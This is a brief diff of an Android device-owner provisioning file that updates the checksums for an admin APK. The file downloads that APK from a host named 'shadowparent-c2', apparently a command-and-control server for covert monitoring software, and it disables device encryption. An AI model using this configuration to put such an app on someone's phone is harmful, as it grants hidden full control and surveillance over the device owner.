@@ -12,9 +12,9 @@
     },
     "adminExtras": {
       "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": "com.sp.core/com.sp.core.AdminReceiver",
-      "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": "43168a80b28fcda559b727716cd9b115a946ff1a8161dbc9bf5dacbd18f477c0",
+      "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": "7ee3488ca407159ff26088a07c8fd0d8d93e73dea2d0e5d5062d626124406722",
       "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_URL": "https://shadowparent-c2.onrender.com/apk/android_UI.apk",
-      "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_SHA256": "43168a80b28fcda559b727716cd9b115a946ff1a8161dbc9bf5dacbd18f477c0",
+      "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_SHA256": "7ee3488ca407159ff26088a07c8fd0d8d93e73dea2d0e5d5062d626124406722",
       "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true,
       "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {}
     }
